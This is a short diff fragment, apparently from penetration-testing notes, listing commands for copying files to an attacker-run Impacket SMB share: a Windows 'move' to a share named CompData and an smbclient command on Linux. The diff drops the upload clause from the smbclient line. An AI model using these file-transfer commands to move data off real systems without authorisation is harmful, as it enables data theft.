@@ -17,4 +17,4 @@ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support 
 windows
 move <file> \\<IP>\CompData
 linux:
-smbclient //<server>/<share> -U <username>%<password> -c "put <local_file> <remote_file>"
+smbclient //<server>/<share> -U <username>%<password>
